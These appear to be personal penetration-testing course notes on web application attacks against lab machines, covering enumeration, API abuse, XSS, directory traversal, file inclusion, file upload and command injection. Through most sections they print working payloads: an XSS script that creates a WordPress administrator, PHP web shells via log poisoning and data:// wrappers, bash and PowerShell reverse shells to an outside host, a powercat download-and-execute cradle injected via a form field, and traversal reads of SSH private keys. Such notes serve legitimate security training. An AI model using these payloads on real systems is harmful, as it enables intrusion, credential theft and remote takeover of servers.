
# Assessment Tools
## Fingerprinting Webservers with NMAP
Nmap can be a got to tool for enumeration
`nmap -sV -p 80 <ip> ` will grab the banner of the web page --> from this we can see the version of server running
We can take enumeration furhter by running service specific NMAP scripts like http-enum
```shell
nmap -p 80 --script=http-enum 192.168.50.20
```
## Wappalyzer
We can passively gather info via Wappalyzer
Navigate to https://www.wappalyzer.com/ and search the domain

## Directory Brute Frorce
We can bruteforce directories with the Gobuster tool
Gobuster supports many modes. Basic Syntax:
```shell
gobuster <mode> -u <ip or url> -w <wordlist>
```
Modes:
- dir: Brute force directories 
- dns: discover subdomains
- s3: discover Amazon s3 buckets
- vhost: discover virtual hosts on the server
- fuzz: fuzz value or name of a parameter
	- ```gobuster fuzz --url [https://example.com/?parameter=FUZZ] --wordlist [path/to/file]```
	- `gobuster fuzz --url [https://example.com/?FUZZ=value] --wordlist [path/to/file]`
Flags:
-u: url
-r: follow redirects
-v: verbose
-U: username for auth
-P: Password for auth
-c: cookie for auth
-t: threads
## Burpsuite
### Proxy tool
We can use the proxy to intercept any traffic before it is passed on to the server
Set up proxy in firefox:
	In Firefox, we can do this by navigating to **about:preferences#general**, scrolling down to _Network Settings_, then clicking _Settings_.
	Let's choose the _Manual_ option, setting the appropriate IP address and listening port. In our case, the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address 127.0.0.1 and specify port 8080.

Now we can see all of the details off packets sent and received by the server
### Repeater
We can send requests to the repeater to edit and resend traffic
### Intruder
we can use the intruder to brute force login attempts
- send POST request to the intruder
- press clear to remove all positioner symbols
- highlight desired field and hit add
- load or paste password attempts into payloads
- if an attempt gives status code 302 an attempt was successful
# Web App Enumeration
## Debugging page content
We can look for file extensions in the url --> this could show us what language the application was written in
Better clues can be found in the web page itself. Especially with the use of a debugger
- JavaScript Frameworks
- hidden input fields
- comments
- client side html controls
- More
We can also use the inspector tool to see where input field map to in the html code
## Inspecting HTTP Response Headers
We can either use the burpsuite proxy, or our browser's own Network tool to inspect packets for more information
Launch Network tool from Web Developer Menu in Firefox. We can see all network activity form **after** the tool launches.
Click on web request to get more detail about it
	Server Header usually displays the server software, and sometimes version
	Non Standard headers use X-. Some of these might be useful to identify the underlying stack
Sitemaps may also be useful --> these tell web crawlers which URLs to crawl
Additionally, Robots.txt may be useful. This usually lists sites to not crawl, which are usually sensitive pages.
## Enumerating and abusing APIs
We can use gobuster to bruteforce API endpoints
API paths are often followed by a version number, resulting in patterns such as /api_name/v1
API names are usually descriptive about the data it is handling or the function it is doing
with this info we can use the pattern gobuster feature to try and brute force API paths
	-p: provides a file with patterns
	in this case we can make a simple file
		{GOBUSTER}/v1
		{GOBUSTER}/v2
`gobuster dir -u http://192.168.50.12:5002 -w /usr/share/wordlists/dirb/big/txt -p pattern`
Sometimes when navigating to URLs where API is found we can discover some of the documentation
If the API discloses any users we can try to bruteforce logins. Additionally we can try to bruteforce the subdirectories under a username's path
	`gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`
To Bruteforce logins, first we need to check if we can log in over the API
	try to curl the any page we may be able to log in on
		this may throw a 405 error of method not supported. By default curl uses GET
	We need to try interacting with POST or PUT
First we can try the login method to see if we are able t verify credentials being overwritten
`curl -i http://192.168.50.16:5002/users/v1/login`
Depending on the error message, this could verify we are able to login using the method
If verified, we can try and login using a dummy password for a valid username known
	We specify a new header of Content type: application/json with -H
	Specify json data via -d
	`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
If this fails we can try other methods such as trying to register as a new user
`curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register`
based on feedback from this request more fields may be required. Tweak request until we can successfully register a user.
Once we know we can register, try registering a user using the admin:True value
	We shouldn't be able to do this but maybe the API is misconfigured
	`curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register`
If there are no error messages, we can try to log in and see if we get an auth token --> if we do, we can go furhter by attempting to change the admin user password
```shell
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
If this doesn't work we may need to explicitly define using a PUT method
```shell
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

We can recreate these steps all within burpsuite
	append --proxy 127.0.0.1:8080 to the end of the curl login command to send it to the proxy 
	send request to the repeater tab
	We can modify this requst to test multiple APIs
We can visit Target--> sitemap within burpsuite to keep track of all the APIs we've tested

whatweb is a tool that can identify technologies being used on a a website.
## Cross site Scripting
Stored XSS, aka persistent xss, occurs when the exploit payload is stored in a database or cached by the server
Refelcted XSS attacks are usually include a payload in a crafetd request or link. This only attacks the person visiting the link
### Javascript Refresher
Javascript is used to make webpages more interactive
Like many programming languages, Javascript  can combine a set of instructions into a function
We don't need to assign variable types since java is a loosely typed language
We can use the console under Dev tools to test Javascript code
### Identifying XSS vulnerabilities
Identify any fields that take user input and use it as output on the next page
	Search bars
Use special characters to test whether the input is sanitized
` < > ' " { } ; ` These characters work best to test this
	Html uses \< and \> to denote elements
	Javascript uses { } in function declarations
	 '  and  " are used to denote strings
	 ;  are used to mark the end of statements
 we want to see if these characters get URL encoded (%20) or HTML encoded "\<" (where they are referenced as is instead of interpreted)
 If we can inject these elements into the page, the browser will treat them as code elements. We can build begin to build code that will execute once the browser loads it
 We may need to use different characters depending on where our code is being injected
	 If our code is being injected in between \<div\> tags we will need \<  \>to create script tags
	 If input is being added within an existing Javascript tag we may only need quotes and semi colons
### Basic XSS
Using the offsec wp as an example:
if we inspect the source code we see the site using a .php file to store data to a database
We can download the file and see the expected format of the data being sent to the wp db
```php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```
php function is responsible for parsing various http headers including  User-Agent
Each time an admin loads the the Visitor plugin the function will execute the code from start.php:
```php
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```
we can see that the user agent field is retrieved from the db without sanitization
we can use Burp to generate a user agent value to inject html code. In this case we can set User-Agent: `<script>alert(58)<\script>`
which will cause a popup when the admin console is opened --> we can use this for more malicious purposes
### Privilege escalation via xss
Things we can do with XSS
Steal cookies
	If a website has poor configuration we can capture cookies and use them to authenticate
	Interested in the flags "Secure" and "Http Only"
	Secure flag instructs the broswer to only send the cookie over encrypted connection --> this protects the cookie
	Httponly flag instructs the browser to deny any java script access to the cookie. If this flag is not set we can use an xss payload to steal a cookie
	Session cookies cannot be stolen by java in xss attacks since they are sent by http
Example: if we log into the offsec wp as admin we see all of the cookies have httponly set. Therefore the previously identified vector isn't good for stealing the cookies
Instead we need to try a different attack --> we need to try and retreive the nonce used for the cookie via JS function
we can use the following JS function to capture the nonce:
```Javascript 
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
This function opens a new Http request towards the address /wp-admin/user-new.php
Then it saves the nonce value provided in the repsonse
Now we can craft a function for creating a new admin user
``` javaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
This will use the nonce value to auth as admin and create a new admin account
before we use this we need to minify and encode it --> we can do this using JSCompress and console
	Navigate to JSCompress in web browser
	paste code and select compress.
	copy code to console and use the following function:
``` Javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
This loop will convert each character to the corresponding utf-16 integer code (==I Think we can do this in burp==)
Make sure we have burp proxy running with intercept on
in terminal execute the following command
```shell
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<OUTPUT FROM PREVIOUS FUNCTION>))</script>" --proxy 127.0.0.1:8080
```
This will instruct the curl command to send our malicious payload to using a specially crafted http request
inspect the payload in Burp to verify it is correct and send
Once the admin clicks the visitors plugin a malicious user will be created
**The Short**
- Identify java code we want to execute for xss vulnerability
- minify
- encode and copy output
- use curl to send encoded functions

# Directory Traversal
## Absolute vs relative path
Absolute - Full file path, Need to use '/' before path to start at root file system
relative - searches in current directory, no '/' in front

if we wanted to access /etc/passwd from our home directory we can use ../../etc/passwd
we can use as many ../ as we want. It becomes arbitrary once we reach the rpoot of the file system
../../../../../../../../../../etc/passwd has the same result as above --> this is useful if we don't know where we are in the filesystem
## Identifying and exploiting
Check for direcotry traversal vulnerability by hovering over all buttons and inspecting all links, navigating to all accessible pages, and examining source code
For Example  `https://example.com/cms/login.php?language=en.html`
- We see the webpage is running php
- We can try to navigate directly to https://example.com/cms/en.html
	- If we can navigate to it we can use this parameter to try other file names
- We see the webapp contains the directory cms, which is running in a subdirectory of the web root
Another example site: `http://mountaindesserts.com/meteor/index.php`
After navigating around the site we notice a few things
- Using php
- a lot of the buttons just link back to the page we are on --> not useful
- link labeled admin at the bottom --> visit link --> new url `http://mountaindesserts.com/meteor/index.php?page=admin.php`
	- We see there is a page parameter to load the admin page
	- We get an error message --> this means info is displayed on the same page
- Navigate directly to `mountaindesserts.com/meteor/admin.php` --> we get the same error message
	- indicates this web page includes content under the page parameter still --> we can use this to test for directory traversal
-  Navigate to `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd ` --> we see the /etc/passwd file
We can also recover other sensitive info like the other user's ssh keys --> usually stored in /home/user/.ssh
We can navigate the the desired address in the web browser and if it works use curl to download the key
`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
We can save the private key to a file called dt_key and use it to ssh into the box
`ssh -i dt_key -p 2222 offsec@mountaindesserts.com
-i option let's us specify the private key to ssh
remember to chmod 400 the private key so it has the proper permissions

On Windows we can test for this vulnerability by trying to read  C:\Windows\System32\drivers\etc\hosts --> this file is readable by all local users. If we can read it a vuln exists and we can try to recover sensitive data
FInding sensitive info on windows is a little more difficult than linux --> if we can identify services running we should research where logs and configs are stored

When using curl we can use the flag '--path-as-is' to make sure our address is sent as types

## Encoding Special Characters
Since '../' is a known way to abuse directory traversal many sites sanitize it
To get around this we can use URL Encoding (percent encoding)
`curl http://192.168.50.16/cgi-bin/../../../../etc/passwd` becomes `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
# File Inclusion Vulnerabilities
## Local File Inclusion
File inclusion vulnerabilities allow us to include a file  in the application's running code. This is different form directory traversal vulnerabilities which give s access to files on the target machine
Since we can include files in an application's code we can also display files
The goal of LFI is to obtain RCE
One method to do this is **log poisoning** --> we can modify data we send to a web app so that the logs contain executable code
To do this we need to know what info is controlled by us and saved in the apache logs  --> we need to either use LFI to display the file or read documentation to understand this
In this example we use LFI to display the log and see the contents
```shell
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
Output:
```
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
We see that the User Agent is logged --> we can modify this header with burp to log executable code
- Navigate to the admin page --> need to go to a regular page so it logs
- Intercept the traffic in Burp and Modify User Agent to `Mozilla/5.0 <?php echo system($_GET['cmd']); ?>` 
This snippet accepts a command via the cmd parameter and executes it using the system function --> we can supply the command in subsequent requests
To do this successfully we need to still specify the page and use the  '&' delimiter to also specify 'cmd'
To execute  command our address will look like this, ps command used in example
`/meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ps`
In our response we should get the output of ps --> this verifies the exploit works
We can now send traffic to this address and change the command to run anything we want
Let's try a reverse shell:
``` bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
==Note the above command won't work since php natively spawns a Bourne Shell (sh)==
To get php the runa  bash shell we ned to execute the following command
```sh
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
and we URL encode it
```sh
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

There are some differences with conducting LFI attacks against Windows
- php code wwill function on both Linux and windows --> OS independent
- File Location will be different
	-  For example, on a target running XAMPP the Apache logs can be found in C:\\xampp\\apache\\logs\\.

Other Frameworks vulnerable to LFI and RFI
	 _Perl_,[11](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn11) _Active Server Pages Extended_,[12](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn12) _Active Server Pages_,[13](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn13) and _Java Server Pages_.[14](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn14) Exploiting these kinds of vulnerabilities is very similar across these languages.


## PHP Wrappers
PHP wrappers are a variety of ways to ehance the php language --> more capabilities we can use to exploit
**php://filter** - displays the contents of a file with or without encoding --> we can use this to display the contents of executable files instead of running them
When examining Mountain Desserts website we notice that the close body tag is missing from what we can see in the browser --> this indicates that php code is executing server side to finish the page --> we can try to use php filters to see the source
php filter uses resource to specify the file to read. We can also specify absolute or relative paths
```shell
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
the output of this command is the same as running it without the wrapper --> this is because the code is listed, but then still executed --> we need to use encoding
we add `conver.base64-encode` to the previous command to use base64 encoding
```shell
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
This gets us the previously hidden code in a base 64 encoded string
we can use the base64 command to decode
`echo "<string>" | base64 -d`
This will output the code in plain text
These php files might contain credentials or make us aware to further vulnerabilities in the system

**data://** - used to embed data elements as plaintext or base64 data in running web app code --> this can allow us to execute code when we cannot poison a local file with php
we can try to embed a small snippet of url encoded php into the web app
```shell
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
the output includes the ls command which shows we can successfully use the File inclusion vuln and data wrapper.
Sometimes web apps have filters for security and will filter on common attack commands like system --> we can use base64 encoding
```shell
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

==data:// will not work with the default php installation== --> we need *allow_url_include* setting to se be enabled
## Remote File Inclusion (RFI)
RFI allows us to include files from a remote system over http or SMB. The included file is also executed in the context of the web application
we can discover RFI vulnerabilities using the same techniques for directory traversal and lfi
==Kali includes several php webshells under /usr/share/webshells/php== --> these can be used for RFI
For this example we will use the simple-backdoor.php webshell which takes a command through the command parameter like the php snippet we used before
we need to host the webshell somewhere so it is accessible --> use `python3 http.server`
we then use curl to invoke the rfi vuln
```shell
curl "http://mountaindesserts/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

# File Upload Vulnerabilities
## Using executable files
We can make educated guesses to locate file upload mechanisms
if the website is a Content Manager System (CMS) we can often upload profile pictures or create blog posts with documents
Sometimes mechanisms are not obvious to users so we should make sure to fully enumerate a website
Once we identify an upload mechanism we can start to probe it to see how well it is configured
- can we upload unintended file types
- Are any file types blocked

Obfuscation Techniques
- Try to upload php files with lesser used php file types --> good concept for any web scripting language
- Try capitalizing some letters in the file extension --> many filters are only filtering on the lowercase version

Once we upload a file we can use curl or navigate to the webpage to get it to execute
```shell
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```
==When executing commands on windows host make sure to use the correct slashes==

If we know the underlying host is windows we can use Powershell one liners for reverse shells --> since we have many special characters in this we need to encode it.
The following powershell commands show how to do this in powershell
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```
We can copy off the output of $EncodedText to use as a command for our webshell
```shell
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
This should allow us to receive a reverse shell in Netcat

==If we can upload files to arbitrary parts of the system, we can upload files that are hosted by the website==
for example on an aspx website we can upload the cmdasp.apx web shell where the default website root is. Then we can navigate to the webshell and execute commands on the system --> requires you to look up directory structure of underlying system and software to make sure you put it somewhere to navigate to

## Non Executable Files
In situations where we cannot execute an uploaded file we need to leverage other vulnerabilities to abuse the file upload mechanism --> we can use Directory traversal for example
Test to see what types of files we can upload
We can try to upload files using the relative path to blindly overwrite files --> We have no way of knowing if the files are properly sanitized on the server side
Execution
- Upload a file and capture POST request in Burp
- Send request to repeater
- modify filename parameter so it contains as many "../" as desired
- Send -> Note despite getting an okay response  that shows the malicious filepath the web server might have sanitized it server side
One file to blindly over write is authorized_keys for ssh access
since we can't enumerate users we have to try this for root --> well confgured machines shouldn't allow root access via ssh, but this might be the only user option
- Create a new key pair using ssh-keygen
- copy public key to "authorized_keys"
- try to upload and overwrite file
- attempt to ssh in using the newly generated key
## OS Command Injection
Sometimes Websites will give us the ability to specify commands
COmmands are usually filtered, but we can verify this by trying to run arbitrary commands
On the mountaindesserts website we see that it wants us to run git clone
run the command once to get the http history in Burp proxy --> we can identify the structure of the request and either send it to the repeater or use curl
We see the app is using the archive parameter to specify the command --> we need to use curl in the folowing format:
```shell
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```
Let's try to run ipconfig instead --> it is blocked by the command filter
Let's see if we can run any git command --> try git version --> it works and we see we are on windows
Now let's try to abuse shell/cmd syntax to embed our malicious command
We can use a url encoded semi colon, %3B, to try and run multiple commands
```shell
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
It works. Both commands were run --> now we need to find out if we are in cmd or powershell
==We can use the following command to determine if we are in cmd or powershell==
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
This will output what terminal we are in
Make sure we url encode this
in the example we idnetify powershell --> Let's use Powercat (a powershell version of netcat) to get a reverse shell
- host powercat on webserver
- use command injection to download and execute powerat
In plaintext the command will look like this:
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
 The first part uses a PowerShell download cradle to load the Powercat function contained in the **powercat.ps1** script from our web server. The second command uses the _powercat_ function to create the reverse shell with the following parameters: **-c** to specify where to connect, **-p** for the port, and **-e** for executing a program.
 Then we URL encode special charatcers and use the technique we discovered with curl
 ```shell
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
This connects back to us with a reverse shell. 

==Good Resource== https://github.com/payloadbox/command-injection-payload-list --> we may need to encapsulate commands in special characters to get them to work
- try single and/or double quotes
- try putting & before bash commands

# Techniques
Use dev tools to look at source code, maybe find comments or unintended data left over

robots.txt may contain interesting directories

check all input forms, if they display anything on the screen they may be vulnerable to injection

sitemap.xml lists all websites owner wants on the search page --> look and see if there are more directories

Headers can give info about software versions for server and framework --> maybe versions are out of date and there are exploits

try googling site specific pages using "site:"

----COMMANDS------

Curl - downloads web page

----- tools-----------------

Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.


Wayback Machine

The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.


